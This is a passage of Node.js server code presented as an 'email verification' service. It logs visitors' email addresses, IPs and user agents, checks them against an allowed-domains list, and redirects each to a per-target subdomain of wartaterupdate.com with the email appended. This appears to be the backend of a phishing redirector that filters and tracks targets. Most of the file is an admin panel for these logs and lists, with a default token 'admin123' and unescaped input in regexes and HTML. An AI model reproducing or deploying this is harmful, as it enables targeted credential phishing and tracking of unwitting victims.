import { MongoClient, ObjectId } from 'mongodb';
import formidable from 'formidable';
import fs from 'fs';

// Environment variables with fallbacks
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://username:password@cluster.mongodb.net/email-verification?retryWrites=true&w=majority';
const DB_NAME = process.env.MONGODB_DB || 'email-verification';
const EMAILS_COLLECTION = 'emails';
const DOMAINS_COLLECTION = 'allowed_domains';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin123';

// NEW: Configurable redirect URL from environment variable
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://{domain}.wartaterupdate.com/9e639fa927324ca2a294b73e2b58d1fc/?ext={email}';

// Connection caching
let cachedClient = null;
let cachedDb = null;

// Connect to MongoDB database
async function connectToDatabase() {
  try {
    if (cachedClient && cachedDb) {
      return { client: cachedClient, db: cachedDb };
    }
    const client = new MongoClient(MONGODB_URI);
    await client.connect();
    
    const db = client.db(DB_NAME);
    
    cachedClient = client;
    cachedDb = db;
    
    return { client, db };
  } catch (error) {
    console.error("MongoDB connection error:", error);
    throw error;
  }
}

// Extract domain from email
function getDomainFromEmail(email) {
  return email.split('@')[1].toLowerCase();
}

// Extract the base domain from an email address
function generateCleanDomainFromEmail(email) {
  const domain = email.split('@')[1].toLowerCase();
  const domainParts = domain.split('.');
  const baseDomain = domainParts.length > 1 ? domainParts[domainParts.length - 2] : domainParts[0];
  return baseDomain;
}

// Generate redirect URL using environment variable
function generateRedirectUrl(email) {
  const cleanDomain = generateCleanDomainFromEmail(email);
  // Replace placeholders with actual values
  return REDIRECT_URL
    .replace('{domain}', cleanDomain)
    .replace('{email}', email);
}

// Log email to database
async function logEmail(email, userAgent, ip) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(EMAILS_COLLECTION);
    
    const emailEntry = {
      email,
      timestamp: new Date(),
      userAgent: userAgent || 'Unknown',
      ip: ip || 'Unknown',
      domain: getDomainFromEmail(email)
    };
    
    await collection.insertOne(emailEntry);
    return true;
  } catch (error) {
    console.error('Error logging email:', error);
    return false;
  }
}

// Check if domain is allowed
async function isDomainAllowed(domain) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    const domainRecord = await collection.findOne({ 
      domain: domain.toLowerCase() 
    });
    
    return !!domainRecord;
  } catch (error) {
    console.error('Error checking domain:', error);
    return false;
  }
}

// Add domain to allowed list
async function addDomain(domain, addedBy = 'system') {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    // Check if domain already exists
    const existingDomain = await collection.findOne({ domain: domain.toLowerCase() });
    if (existingDomain) {
      return { success: true, message: 'Domain already exists', alreadyExists: true };
    }
    
    const result = await collection.insertOne({
      domain: domain.toLowerCase(),
      addedAt: new Date(),
      addedBy: addedBy
    });
    
    return { success: true, message: 'Domain added successfully', id: result.insertedId };
  } catch (error) {
    console.error('Error adding domain:', error);
    return { success: false, message: 'Error adding domain', error: error.message };
  }
}

// Bulk add domains to the allowed list (optimized for large batches)
async function bulkAddDomains(domains, addedBy = 'system') {
  if (!domains || domains.length === 0) {
    return { success: false, message: 'No domains to add' };
  }

  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    // Find which domains already exist to avoid duplicates
    const existingDomainsQuery = await collection.find({
      domain: { $in: domains.map(d => d.toLowerCase()) }
    }).project({ domain: 1 }).toArray();
    
    const existingDomainSet = new Set(existingDomainsQuery.map(d => d.domain));
    
    // Filter out domains that already exist
    const newDomains = domains.filter(d => !existingDomainSet.has(d.toLowerCase()));
    
    if (newDomains.length === 0) {
      return { 
        success: true, 
        message: 'All domains already exist', 
        added: 0,
        skipped: domains.length
      };
    }
    
    // Prepare documents for bulk insert
    const domainsToInsert = newDomains.map(domain => ({
      domain: domain.toLowerCase(),
      addedAt: new Date(),
      addedBy: addedBy
    }));
    
    // Perform bulk insert
    const result = await collection.insertMany(domainsToInsert);
    
    return { 
      success: true, 
      message: `Added ${result.insertedCount} domain(s)`, 
      added: result.insertedCount,
      skipped: domains.length - newDomains.length
    };
  } catch (error) {
    console.error('Error bulk adding domains:', error);
    return { success: false, message: 'Error adding domains', error: error.message };
  }
}

// Delete domain from allowed list
async function deleteDomain(domain) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    const result = await collection.deleteOne({ 
      domain: domain.toLowerCase() 
    });
    
    if (result.deletedCount === 0) {
      return { success: false, message: 'Domain not found' };
    }
    
    return { success: true, message: 'Domain deleted successfully' };
  } catch (error) {
    console.error('Error deleting domain:', error);
    return { success: false, message: 'Error deleting domain', error: error.message };
  }
}

// Bulk delete domains from the allowed list
async function bulkDeleteDomains(domains) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    if (!domains || !Array.isArray(domains) || domains.length === 0) {
      return { success: false, message: 'No domains provided for deletion' };
    }
    
    const lowerCaseDomains = domains.map(d => d.toLowerCase());
    
    const result = await collection.deleteMany({ 
      domain: { $in: lowerCaseDomains } 
    });
    
    if (result.deletedCount === 0) {
      return { success: false, message: 'No domains were deleted' };
    }
    
    return { 
      success: true, 
      message: `${result.deletedCount} domain${result.deletedCount !== 1 ? 's' : ''} deleted successfully`,
      count: result.deletedCount
    };
  } catch (error) {
    console.error('Error bulk deleting domains:', error);
    return { success: false, message: 'Error deleting domains', error: error.message };
  }
}

// Delete all domains from the allowed list
async function removeAllDomains() {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    // Get count before deletion to know how many were deleted
    const totalCount = await collection.countDocuments({});
    
    if (totalCount === 0) {
      return { success: false, message: 'No domains to delete' };
    }
    
    const result = await collection.deleteMany({});
    
    return { 
      success: true, 
      message: `All domains deleted successfully (${result.deletedCount} total)`,
      count: result.deletedCount
    };
  } catch (error) {
    console.error('Error deleting all domains:', error);
    return { success: false, message: 'Error deleting domains', error: error.message };
  }
}

// NEW: Delete a single email log
async function deleteEmail(id) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(EMAILS_COLLECTION);
    
    const result = await collection.deleteOne({ 
      _id: new ObjectId(id)
    });
    
    if (result.deletedCount === 0) {
      return { success: false, message: 'Email log not found' };
    }
    
    return { success: true, message: 'Email log deleted successfully' };
  } catch (error) {
    console.error('Error deleting email log:', error);
    return { success: false, message: 'Error deleting email log', error: error.message };
  }
}

// NEW: Bulk delete email logs
async function bulkDeleteEmails(ids) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(EMAILS_COLLECTION);
    
    if (!ids || !Array.isArray(ids) || ids.length === 0) {
      return { success: false, message: 'No email logs provided for deletion' };
    }
    
    const objectIds = ids.map(id => new ObjectId(id));
    
    const result = await collection.deleteMany({ 
      _id: { $in: objectIds } 
    });
    
    if (result.deletedCount === 0) {
      return { success: false, message: 'No email logs were deleted' };
    }
    
    return { 
      success: true, 
      message: `${result.deletedCount} email log${result.deletedCount !== 1 ? 's' : ''} deleted successfully`,
      count: result.deletedCount
    };
  } catch (error) {
    console.error('Error bulk deleting email logs:', error);
    return { success: false, message: 'Error deleting email logs', error: error.message };
  }
}

// NEW: Delete all email logs
async function removeAllEmails() {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(EMAILS_COLLECTION);
    
    // Get count before deletion to know how many were deleted
    const totalCount = await collection.countDocuments({});
    
    if (totalCount === 0) {
      return { success: false, message: 'No email logs to delete' };
    }
    
    const result = await collection.deleteMany({});
    
    return { 
      success: true, 
      message: `All email logs deleted successfully (${result.deletedCount} total)`,
      count: result.deletedCount
    };
  } catch (error) {
    console.error('Error deleting all email logs:', error);
    return { success: false, message: 'Error deleting email logs', error: error.message };
  }
}

// Get emails with pagination and search
async function getEmails(page = 1, pageSize = 50, search = '') {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(EMAILS_COLLECTION);
    
    let query = {};
    if (search && search.trim() !== '') {
      const searchRegex = new RegExp(search.trim(), 'i');
      query = {
        $or: [
          { email: searchRegex },
          { domain: searchRegex }
        ]
      };
    }
    
    const totalCount = await collection.countDocuments(query);
    const skip = (page - 1) * pageSize;
    
    const emails = await collection.find(query)
      .sort({ timestamp: -1 })
      .skip(skip)
      .limit(pageSize)
      .toArray();
    
    const totalPages = Math.ceil(totalCount / pageSize);
    
    return {
      emails,
      pagination: {
        totalCount,
        totalPages,
        currentPage: page,
        pageSize,
        hasNextPage: page < totalPages,
        hasPrevPage: page > 1,
        search: search
      }
    };
  } catch (error) {
    console.error('Error getting emails:', error);
    return { emails: [], pagination: { totalCount: 0, totalPages: 0, currentPage: page, pageSize } };
  }
}

// Get allowed domains with pagination and search
async function getDomains(page = 1, pageSize = 50, search = '') {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    let query = {};
    if (search && search.trim() !== '') {
      const searchRegex = new RegExp(search.trim(), 'i');
      query = { domain: searchRegex };
    }
    
    const totalCount = await collection.countDocuments(query);
    const skip = (page - 1) * pageSize;
    
    const domains = await collection.find(query)
      .sort({ addedAt: -1 })
      .skip(skip)
      .limit(pageSize)
      .toArray();
    
    const totalPages = Math.ceil(totalCount / pageSize);
    
    return {
      domains,
      pagination: {
        totalCount,
        totalPages,
        currentPage: page,
        pageSize,
        hasNextPage: page < totalPages,
        hasPrevPage: page > 1,
        search: search
      }
    };
  } catch (error) {
    console.error('Error getting domains:', error);
    return { domains: [], pagination: { totalCount: 0, totalPages: 0, currentPage: page, pageSize } };
  }
}

// Process text content of domains and add to database (optimized for large files)
async function processDomainTextContent(content, addedBy = 'file-upload') {
  try {
    const results = {
      totalProcessed: 0,
      added: 0,
      skipped: 0,
      failed: 0,
      details: []
    };
    
    // Split content by newlines and filter empty lines
    const domains = content.split(/\r?\n/).filter(line => line.trim() !== '');
    results.totalProcessed = domains.length;
    
    // Validate domains - filter out invalid ones
    const domainRegex = /^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,}$/;
    const validDomains = [];
    const invalidDomains = [];
    
    for (const domain of domains) {
      const cleanDomain = domain.trim().toLowerCase();
      if (domainRegex.test(cleanDomain)) {
        validDomains.push(cleanDomain);
      } else {
        invalidDomains.push({
          domain: cleanDomain,
          status: 'failed',
          reason: 'Invalid domain format'
        });
      }
    }
    
    results.failed = invalidDomains.length;
    results.details = [...invalidDomains]; // Store invalid domains in details
    
    // Process valid domains in batches for better performance
    if (validDomains.length > 0) {
      // Use bulk operation for efficiency
      const batchResult = await bulkAddDomains(validDomains, addedBy);
      
      if (batchResult.success) {
        results.added = batchResult.added || 0;
        results.skipped = batchResult.skipped || 0;
      } else {
        // If bulk operation failed, fall back to individual processing
        console.error('Bulk processing failed, falling back to individual processing:', batchResult.message);
        
        // Process each domain individually as fallback
        for (const domain of validDomains) {
          try {
            const result = await addDomain(domain, addedBy);
            
            if (result.success) {
              if (result.alreadyExists) {
                results.skipped++;
                results.details.push({
                  domain,
                  status: 'skipped',
                  reason: 'Already exists'
                });
              } else {
                results.added++;
                results.details.push({
                  domain,
                  status: 'added',
                  id: result.id
                });
              }
            } else {
              results.failed++;
              results.details.push({
                domain,
                status: 'failed',
                reason: result.message || 'Unknown error'
              });
            }
          } catch (error) {
            results.failed++;
            results.details.push({
              domain,
              status: 'failed',
              reason: error.message
            });
          }
        }
      }
    }
    
    return results;
  } catch (error) {
    console.error('Error processing domain text content:', error);
    throw error;
  }
}

// HTML for domains admin panel
function getDomainsAdminHtml(domains, pagination, token) {
  const paginationControls = getPaginationHtml(pagination, token, 'domains');
  
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Domain Management</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        h1 { color: #2196F3; margin-bottom: 15px; }
        .container { max-width: 1200px; margin: 0 auto; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f5f5f5; }
        .center-align { text-align: center; }
        .pagination { margin: 20px 0; text-align: center; }
        .page-link { padding: 5px 10px; margin: 0 5px; text-decoration: none; border: 1px solid #ddd; border-radius: 4px; }
        .current { background-color: #2196F3; color: white; }
        .search-form, .add-form { margin: 20px 0; display: flex; }
        .search-input, .add-input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .button { padding: 10px 20px; color: white; border: none; cursor: pointer; border-radius: 4px; }
        .search-button { background-color: #2196F3; }
        .add-button { background-color: #4CAF50; }
        .delete-button { background-color: #f44336; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 4px; }
        .upload-button { display: inline-block; padding: 10px 20px; background-color: #FF9800; color: white; text-decoration: none; margin-right: 10px; border-radius: 4px; }
        .nav-tabs { display: flex; border-bottom: 1px solid #ddd; margin-bottom: 20px; }
        .nav-tab { padding: 10px 20px; cursor: pointer; text-decoration: none; color: #333; }
        .nav-tab.active { border-bottom: 2px solid #2196F3; font-weight: bold; }
        /* Bulk action styles */
        .bulk-action-bar { display: flex; align-items: center; margin-bottom: 10px; background-color: #f5f5f5; padding: 10px; border-radius: 4px; }
        .bulk-checkbox { margin-right: 10px; }
        .bulk-action-button { padding: 6px 12px; background-color: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer; margin-left: 10px; }
        .bulk-action-button:disabled { background-color: #cccccc; cursor: not-allowed; }
        .delete-all-button { background-color: #D32F2F; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 4px; }
        /* Summary card styles */
        .summary-card { 
          background-color: #f8f9fa; 
          border: 1px solid #ddd; 
          border-left: 4px solid #2196F3; 
          padding: 15px; 
          margin-bottom: 20px; 
          border-radius: 4px;
          display: flex;
          align-items: center;
        }
        .summary-icon {
          font-size: 24px;
          margin-right: 15px;
          color: #2196F3;
        }
        .summary-content {
          flex: 1;
        }
        .summary-title {
          font-size: 16px;
          color: #555;
          margin-bottom: 5px;
        }
        .summary-value {
          font-size: 24px;
          font-weight: bold;
          color: #333;
        }
        .action-buttons { 
          margin-bottom: 20px; 
          display: flex; 
          gap: 10px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Domain Management</h1>
        
        <!-- Total domains summary card -->
        <div class="summary-card">
          <div class="summary-icon">📋</div>
          <div class="summary-content">
            <div class="summary-title">Total Allowed Domains</div>
            <div class="summary-value">${pagination.totalCount}</div>
          </div>
        </div>
        
        <div class="nav-tabs">
          <a href="?action=admin&token=${token}&view=emails&format=html" class="nav-tab">Email Logs</a>
          <a href="?action=admin&token=${token}&view=domains&format=html" class="nav-tab active">Allowed Domains</a>
        </div>
        
        <div class="action-buttons">
          <a href="?action=uploadform&token=${token}" class="upload-button">Bulk Upload Domains</a>
          <button onclick="confirmDeleteAllDomains()" class="delete-all-button">Delete All Domains</button>
        </div>
        
        <form class="add-form" id="addDomainForm">
          <input type="text" id="domainInput" placeholder="Enter domain to add (e.g., example.com)" class="add-input" required>
          <button type="submit" class="add-button button">Add Domain</button>
        </form>
        <div id="addMessage" style="margin-bottom: 20px;"></div>
        
        <form class="search-form" method="GET">
          <input type="hidden" name="action" value="admin">
          <input type="hidden" name="token" value="${token}">
          <input type="hidden" name="view" value="domains">
          <input type="hidden" name="format" value="html">
          <input type="text" name="search" placeholder="Search domains..." class="search-input" value="${pagination.search || ''}">
          <button type="submit" class="search-button button">Search</button>
        </form>
        
        <div class="bulk-action-bar">
          <label class="bulk-checkbox">
            <input type="checkbox" onchange="toggleAllDomains(this.checked)"> Select All
          </label>
          <button id="bulkActionButton" class="bulk-action-button" onclick="bulkDeleteDomains()" disabled>Delete Selected</button>
        </div>
        
        ${paginationControls}
        
        <table>
          <tr>
            <th class="center-align" style="width: 40px;"><input type="checkbox" onchange="toggleAllDomains(this.checked)"></th>
            <th>#</th>
            <th>Domain</th>
            <th>Added Date</th>
            <th>Added By</th>
            <th>Actions</th>
          </tr>
          ${domains.map((entry, index) => {
            const domain = entry.domain || 'N/A';
            const addedAt = entry.addedAt ? new Date(entry.addedAt).toLocaleString() : 'N/A';
            const addedBy = entry.addedBy || 'Unknown';
            
            const rowIndex = (pagination.currentPage - 1) * pagination.pageSize + index + 1;
            
            return `
              <tr>
                <td class="center-align"><input type="checkbox" class="domain-checkbox" value="${domain}"></td>
                <td>${rowIndex}</td>
                <td>${domain}</td>
                <td>${addedAt}</td>
                <td>${addedBy}</td>
                <td>
                  <button onclick="deleteDomain('${domain}')" class="delete-button">Delete</button>
                </td>
              </tr>
            `;
          }).join('')}
        </table>
        
        ${paginationControls}
      </div>
      
      <script>
        // Add domain functionality
        document.getElementById('addDomainForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const domain = document.getElementById('domainInput').value.trim();
          const messageElement = document.getElementById('addMessage');
          
          if (!domain) {
            messageElement.textContent = 'Please enter a domain';
            messageElement.style.color = 'red';
            return;
          }
          
          // Basic domain validation
          const domainRegex = /^[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,}$/i;
          if (!domainRegex.test(domain)) {
            messageElement.textContent = 'Invalid domain format';
            messageElement.style.color = 'red';
            return;
          }
          
          messageElement.textContent = 'Adding domain...';
          messageElement.style.color = 'blue';
          
          fetch('?action=adddomain&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              domain: domain,
              addedBy: 'admin-panel'
            }),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              messageElement.textContent = data.message;
              messageElement.style.color = 'green';
              document.getElementById('domainInput').value = '';
              
              // Reload page after successful add
              setTimeout(() => {
                window.location.reload();
              }, 1000);
            } else {
              messageElement.textContent = data.message || 'Failed to add domain';
              messageElement.style.color = 'red';
            }
          })
          .catch(error => {
            messageElement.textContent = 'An error occurred. Please try again.';
            messageElement.style.color = 'red';
            console.error('Error:', error);
          });
        });
        
        // Delete domain functionality
        function deleteDomain(domain) {
          if (!confirm('Are you sure you want to delete ' + domain + '?')) {
            return;
          }
          
          fetch('?action=deletedomain&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              domain: domain
            }),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              alert(data.message);
              window.location.reload();
            } else {
              alert(data.message || 'Failed to delete domain');
            }
          })
          .catch(error => {
            alert('An error occurred while deleting the domain');
            console.error('Error:', error);
          });
        }
        
        // Bulk domain selection/deletion
        function toggleAllDomains(checked) {
          document.querySelectorAll('.domain-checkbox').forEach(checkbox => {
            checkbox.checked = checked;
          });
          updateBulkActionButton();
        }
        
        function updateBulkActionButton() {
          const selectedCount = document.querySelectorAll('.domain-checkbox:checked').length;
          const bulkButton = document.getElementById('bulkActionButton');
          
          if (selectedCount > 0) {
            bulkButton.textContent = \`Delete Selected (\${selectedCount})\`;
            bulkButton.disabled = false;
          } else {
            bulkButton.textContent = 'Delete Selected';
            bulkButton.disabled = true;
          }
        }
        
        function bulkDeleteDomains() {
          const selectedDomains = Array.from(
            document.querySelectorAll('.domain-checkbox:checked')
          ).map(checkbox => checkbox.value);
          
          if (selectedDomains.length === 0) {
            alert('No domains selected');
            return;
          }
          
          if (!confirm(\`Are you sure you want to delete \${selectedDomains.length} domain(s)?\`)) {
            return;
          }
          
          fetch('?action=bulkdeletedomain&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              domains: selectedDomains
            }),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              alert(data.message);
              window.location.reload();
            } else {
              alert('Failed to delete domains: ' + (data.message || 'Unknown error'));
            }
          })
          .catch(error => {
            alert('An error occurred while deleting the domains');
            console.error('Error:', error);
          });
        }
        
        // Delete all domains functionality
        function confirmDeleteAllDomains() {
          const result = confirm('WARNING: This will delete ALL domains in the system. This action cannot be undone. Continue?');
          if (result) {
            const secondConfirm = confirm('Are you ABSOLUTELY sure? All domains will be permanently deleted.');
            if (secondConfirm) {
              deleteAllDomainsAction();
            }
          }
        }
        
        function deleteAllDomainsAction() {
          fetch('?action=deletealldomains&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({}),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              alert(data.message);
              window.location.reload();
            } else {
              alert(data.message || 'Failed to delete all domains');
            }
          })
          .catch(error => {
            alert('An error occurred while deleting all domains');
            console.error('Error:', error);
          });
        }
        
        // Add event listeners for checkbox changes
        document.addEventListener('DOMContentLoaded', function() {
          document.querySelectorAll('.domain-checkbox').forEach(checkbox => {
            checkbox.addEventListener('change', updateBulkActionButton);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// HTML for emails admin panel with fixed alignment for checkboxes
function getEmailsAdminHtml(emails, pagination, token) {
  const paginationControls = getPaginationHtml(pagination, token, 'emails');
  
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Email Verification Admin</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        h1 { color: #2196F3; margin-bottom: 15px; }
        .container { max-width: 1200px; margin: 0 auto; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f5f5f5; }
        .center-align { text-align: center; } /* Fixed checkbox alignment */
        .pagination { margin: 20px 0; text-align: center; }
        .page-link { padding: 5px 10px; margin: 0 5px; text-decoration: none; border: 1px solid #ddd; border-radius: 4px; }
        .current { background-color: #2196F3; color: white; }
        .search-form { margin: 20px 0; display: flex; }
        .search-input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .button { padding: 10px 20px; color: white; border: none; cursor: pointer; border-radius: 4px; }
        .search-button { background-color: #2196F3; }
        .nav-tabs { display: flex; border-bottom: 1px solid #ddd; margin-bottom: 20px; }
        .nav-tab { padding: 10px 20px; cursor: pointer; text-decoration: none; color: #333; }
        .nav-tab.active { border-bottom: 2px solid #2196F3; font-weight: bold; }
        /* Summary card styles */
        .summary-card { 
          background-color: #f8f9fa; 
          border: 1px solid #ddd; 
          border-left: 4px solid #2196F3; 
          padding: 15px; 
          margin-bottom: 20px; 
          border-radius: 4px;
          display: flex;
          align-items: center;
        }
        .summary-icon {
          font-size: 24px;
          margin-right: 15px;
          color: #2196F3;
        }
        .summary-content {
          flex: 1;
        }
        .summary-title {
          font-size: 16px;
          color: #555;
          margin-bottom: 5px;
        }
        .summary-value {
          font-size: 24px;
          font-weight: bold;
          color: #333;
        }
        /* IP Info link style */
        .ip-info-link {
          color: #2196F3;
          text-decoration: none;
        }
        .ip-info-link:hover {
          text-decoration: underline;
        }
        /* NEW: Styles for email deletion */
        .delete-button { 
          background-color: #f44336; 
          color: white; 
          border: none; 
          padding: 5px 10px; 
          cursor: pointer; 
          border-radius: 4px; 
        }
        .delete-all-button { 
          background-color: #D32F2F; 
          color: white; 
          border: none; 
          padding: 10px 20px; 
          cursor: pointer; 
          border-radius: 4px; 
        }
        .bulk-action-bar { 
          display: flex; 
          align-items: center; 
          margin-bottom: 10px; 
          background-color: #f5f5f5; 
          padding: 10px; 
          border-radius: 4px; 
        }
        .bulk-checkbox { 
          margin-right: 10px; 
        }
        .bulk-action-button { 
          padding: 6px 12px; 
          background-color: #f44336; 
          color: white; 
          border: none; 
          border-radius: 4px; 
          cursor: pointer; 
          margin-left: 10px; 
        }
        .bulk-action-button:disabled { 
          background-color: #cccccc; 
          cursor: not-allowed; 
        }
        .action-buttons { 
          margin-bottom: 20px; 
          display: flex; 
          gap: 10px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>Email Verification Admin</h1>
        
        <!-- Total emails summary card -->
        <div class="summary-card">
          <div class="summary-icon">📧</div>
          <div class="summary-content">
            <div class="summary-title">Total Email Logs</div>
            <div class="summary-value">${pagination.totalCount}</div>
          </div>
        </div>
        
        <div class="nav-tabs">
          <a href="?action=admin&token=${token}&view=emails&format=html" class="nav-tab active">Email Logs</a>
          <a href="?action=admin&token=${token}&view=domains&format=html" class="nav-tab">Allowed Domains</a>
        </div>
        
        <!-- NEW: Action buttons for email management -->
        <div class="action-buttons">
          <button onclick="confirmDeleteAllEmails()" class="delete-all-button">Delete All Email Logs</button>
        </div>
        
        <form class="search-form" method="GET">
          <input type="hidden" name="action" value="admin">
          <input type="hidden" name="token" value="${token}">
          <input type="hidden" name="view" value="emails">
          <input type="hidden" name="format" value="html">
          <input type="text" name="search" placeholder="Search emails..." class="search-input" value="${pagination.search || ''}">
          <button type="submit" class="search-button button">Search</button>
        </form>
        
        <!-- NEW: Bulk action bar for emails -->
        <div class="bulk-action-bar">
          <label class="bulk-checkbox">
            <input type="checkbox" onchange="toggleAllEmails(this.checked)"> Select All
          </label>
          <button id="bulkActionButton" class="bulk-action-button" onclick="bulkDeleteEmails()" disabled>Delete Selected</button>
        </div>
        
        ${paginationControls}
        
        <table>
          <tr>
            <!-- Fixed alignment for the checkbox column header -->
            <th class="center-align" style="width: 40px;">
              <input type="checkbox" onchange="toggleAllEmails(this.checked)">
            </th>
            <th>#</th>
            <th>Email</th>
            <th>Domain</th>
            <th>Timestamp</th>
            <th>User Agent</th>
            <th>IP</th>
            <th>Actions</th>
          </tr>
          ${emails.map((entry, index) => {
            const id = entry._id || '';
            const email = entry.email || 'N/A';
            const domain = entry.domain || 'N/A';
            const timestamp = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : 'N/A';
            const userAgent = entry.userAgent || 'Unknown';
            const ip = entry.ip || 'Unknown';
            // Create clickable IP link to ipinfo.io
            const ipDisplay = ip !== 'Unknown' ? 
              `<a href="https://ipinfo.io/${ip}" target="_blank" class="ip-info-link">${ip}</a>` : 
              'Unknown';
            
            const rowIndex = (pagination.currentPage - 1) * pagination.pageSize + index + 1;
            
            return `
              <tr>
                <!-- Also fix alignment for the data cell checkboxes -->
                <td class="center-align">
                  <input type="checkbox" class="email-checkbox" value="${id}">
                </td>
                <td>${rowIndex}</td>
                <td>${email}</td>
                <td>${domain}</td>
                <td>${timestamp}</td>
                <td>${userAgent}</td>
                <td>${ipDisplay}</td>
                <td>
                  <button onclick="deleteEmail('${id}')" class="delete-button">Delete</button>
                </td>
              </tr>
            `;
          }).join('')}
        </table>
        
        ${paginationControls}
      </div>
      
      <script>
        // NEW: Delete email functionality
        function deleteEmail(id) {
          if (!confirm('Are you sure you want to delete this email log?')) {
            return;
          }
          
          fetch('?action=deleteemail&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              id: id
            }),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              alert(data.message);
              window.location.reload();
            } else {
              alert(data.message || 'Failed to delete email log');
            }
          })
          .catch(error => {
            alert('An error occurred while deleting the email log');
            console.error('Error:', error);
          });
        }
        
        // NEW: Bulk email selection/deletion
        function toggleAllEmails(checked) {
          document.querySelectorAll('.email-checkbox').forEach(checkbox => {
            checkbox.checked = checked;
          });
          updateBulkActionButton();
        }
        
        function updateBulkActionButton() {
          const selectedCount = document.querySelectorAll('.email-checkbox:checked').length;
          const bulkButton = document.getElementById('bulkActionButton');
          
          if (selectedCount > 0) {
            bulkButton.textContent = \`Delete Selected (\${selectedCount})\`;
            bulkButton.disabled = false;
          } else {
            bulkButton.textContent = 'Delete Selected';
            bulkButton.disabled = true;
          }
        }
        
        function bulkDeleteEmails() {
          const selectedEmails = Array.from(
            document.querySelectorAll('.email-checkbox:checked')
          ).map(checkbox => checkbox.value);
          
          if (selectedEmails.length === 0) {
            alert('No email logs selected');
            return;
          }
          
          if (!confirm(\`Are you sure you want to delete \${selectedEmails.length} email log(s)?\`)) {
            return;
          }
          
          fetch('?action=bulkdeleteemail&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              ids: selectedEmails
            }),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              alert(data.message);
              window.location.reload();
            } else {
              alert('Failed to delete email logs: ' + (data.message || 'Unknown error'));
            }
          })
          .catch(error => {
            alert('An error occurred while deleting the email logs');
            console.error('Error:', error);
          });
        }
        
        // NEW: Delete all emails functionality
        function confirmDeleteAllEmails() {
          const result = confirm('WARNING: This will delete ALL email logs in the system. This action cannot be undone. Continue?');
          if (result) {
            const secondConfirm = confirm('Are you ABSOLUTELY sure? All email logs will be permanently deleted.');
            if (secondConfirm) {
              deleteAllEmailsAction();
            }
          }
        }
        
        function deleteAllEmailsAction() {
          fetch('?action=deleteallemails&token=${token}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({}),
          })
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              alert(data.message);
              window.location.reload();
            } else {
              alert(data.message || 'Failed to delete all email logs');
            }
          })
          .catch(error => {
            alert('An error occurred while deleting all email logs');
            console.error('Error:', error);
          });
        }
        
        // Add event listeners for checkbox changes
        document.addEventListener('DOMContentLoaded', function() {
          document.querySelectorAll('.email-checkbox').forEach(checkbox => {
            checkbox.addEventListener('change', updateBulkActionButton);
          });
        });
      </script>
    </body>
    </html>
  `;
}

// HTML pagination controls
function getPaginationHtml(pagination, token, view) {
  if (pagination.totalPages <= 1) {
    return `<div class="pagination">${pagination.totalCount} total records</div>`;
  }
  
  let paginationHtml = '<div class="pagination">';
  
  if (pagination.hasPrevPage) {
    paginationHtml += `<a href="?action=admin&token=${token}&view=${view}&format=html&page=${pagination.currentPage - 1}&search=${pagination.search || ''}" class="page-link">Previous</a>`;
  } else {
    paginationHtml += `<span class="page-link" style="color: #ccc;">Previous</span>`;
  }
  
  const maxPages = 5;
  const startPage = Math.max(1, pagination.currentPage - 2);
